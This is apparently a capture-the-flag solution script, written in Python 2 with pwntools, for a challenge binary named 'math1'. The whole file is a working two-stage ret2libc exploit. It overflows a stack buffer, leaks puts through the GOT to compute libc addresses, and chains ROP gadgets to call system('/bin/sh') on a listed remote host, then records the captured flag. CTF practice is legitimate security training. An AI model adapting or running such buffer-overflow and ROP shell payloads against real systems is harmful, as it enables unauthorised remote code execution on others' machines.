#!/usr/bin/env/ python2
from pwn import *
# context.log_level = 'error'
import sys
HOST = '104.199.120.115'
PORT = 17073
BINARY = './math1'

def solve_100(p):
    p.recvline()
    for i in range(100):
        msg = p.recv().strip().split(' ')
        ans = int(msg[0]) + int(msg[2])
        p.sendline(str(ans))

def solve_100_2(p,arg1):
    msg = arg1.strip().split(' ')
    ans = int(msg[0]) + int(msg[2])
    p.sendline(str(ans))
    for i in range(99):
        msg = p.recv().strip().split(' ')
        ans = int(msg[0]) + int(msg[2])
        p.sendline(str(ans))

def exploit(p, local=True):
    #infos
    bufsize = 0x100
    e = ELF(BINARY)
    #offsets
    if(local):
        #offsets local
        bin_sh_offset = 0x1b3e9a
        puts_offset = 0x0809c0
        system_offset = 0x04f440
    else:
        #offset server
        bin_sh_offset = 0x1b75aa
        puts_offset = 0x0875a0
        system_offset = 0x055410
    #important addresses
    puts_got = e.got['puts']
    puts_plt = e.symbols['puts']
    main_addr = 0x4016e8
    #gadgets
    pop_rdi = 0x40186b
    ret = 0x401016
    #payload 1
    payload1 = ""
    payload1 += "A"*(bufsize+8)
    payload1 += p64(pop_rdi)
    payload1 += p64(puts_got)
    payload1 += p64(puts_plt)
    payload1 += p64(main_addr)
    #solve math
    solve_100(p)
    p.recv()
    #leak
    p.sendline(payload1)
    #parse leak
    leak_all = p.recv().strip().split('\n')
    # print leak_all
    leak = leak_all[0]
    first_arg = leak_all[2]
    puts_actual = u64(leak+"\x00"*2)
    # print hex(puts_actual)
    base = puts_actual - puts_offset
    bin_sh_actual = base + bin_sh_offset
    system_actual = base + system_offset
    #logging
    print 'puts_leak: '+hex(puts_actual)
    print 'base: '+hex(base)
    print 'bin_sh: '+hex(bin_sh_actual)
    print 'system: '+hex(system_actual)
    #solve math
    solve_100_2(p,first_arg)
    #stage 2 payload
    payload2 = ""
    payload2 += "B"*(bufsize+8)
    payload2 += p64(ret)
    payload2 += p64(pop_rdi)
    payload2 += p64(bin_sh_actual)
    payload2 += p64(system_actual)
    payload2 += p64(0)
    #call shell
    p.recvuntil('>')
    p.sendline(payload2)
    p.interactive()
    

if __name__ == "__main__":
    if (len(sys.argv) == 2):
        # remote
        r = remote(HOST, PORT)
        exploit(r,False)
    else:
        # local
        p = process(BINARY)
        exploit(p)

# FLAG : JOINTS20{Pwn1N6_W1tH_r0P_g4D6Et}

